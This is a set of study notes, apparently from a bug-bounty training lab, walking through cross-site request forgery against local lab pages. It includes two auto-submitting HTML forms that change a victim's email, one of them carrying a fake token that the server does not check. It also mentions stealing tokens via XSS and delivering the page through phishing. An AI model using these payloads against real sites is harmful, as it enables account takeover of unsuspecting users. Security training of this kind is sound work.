
***Trick unsuspecting users into performing an action on an application they are autheticated to***

 We can login with provided username and password
 After logging in we have the option of updating our Email
 There is no CSRF protection on this


Copy the HTML form element in which we put the new email that we want to update to
and make it an HTML doc by  adding required elements

We are going to load this form of somewhere else so add the pull path to form action property

Can remove extra div's that were inside of the form and unnecessary styling as well

```html
<html>
     <body>
           <form action="http://localhost/labs/csrf0x01.php" method="post">
                   
                        
             <input type="text" name="email" placeholder="Enter email"    value="csrf@csrf.com">
                    
             <button type="submit" class="btn btn-primary">Submit</button>
                    
         </form>
         
         <script>
         
         window.onload = function() {
         document.forms[0].submit();
         //there is only 1 from in this page so index 0 
         }
         
         </script>
         
	</body>
</html>

```


When we load this page there will only be the input and button and user will know it is probably a scam

So we add a script to auto submit

Now lets say he landed on our page from an XSS exploit or a phishing email

The form will auto-submit with the value of the email that we want

```sh
file:///home/jeetu855/TCM_PBB/bugbounty/OtherCommonVulns/CSRF/csrf1.html
```

Type that in browser to load our page for testing purpose


![[csrf1.png]]

And the targets email automatically updates to our desired email


---


### CSRF Token Bypass

We again have the functionality to update emails

We we load a page, we get a token and if we dont submit that token, the request will be blocked

So what we did before was submit the form without CSRF token, it will be blocked

Check if the app is vulnerable to XSS. If it is, we can steal the CSRF token with XSS, inject that into our payload and change the email to our desired email

CSRF token easy to bypass if we have XSS

Sometimes the CSRF token is just there and the server dosent validate it on submission
or Sometimes the server just checks if the Token exists or not

Check appecexplained gitbbook

Can jeremy's CSRF token be valid for Jessamy as well and a lot of such cases

For this lab, in the same payload just add random CSRF token and check if the validates it or not

```html
<html>
     <body>
           <form action="http://localhost/labs/csrf0x02.php" method="post">
                   
                        
             <input type="text" name="email" placeholder="Enter email" value="csrf@csrf.com">
             <input type="text" name="csrf" id="csrf" value="Incursiowashere" hidden>
             <button type="submit" class="btn btn-primary">Submit</button>
                    
         </form>
         
         <script>
         
         window.onload = function() {
         document.forms[0].submit();
         //there is only 1 from in this page so index 0 
         }
         
         </script>
         
	</body>
</html>

```



![[csrf2.png]]


And we update the email because of no validation of CSRF token by the server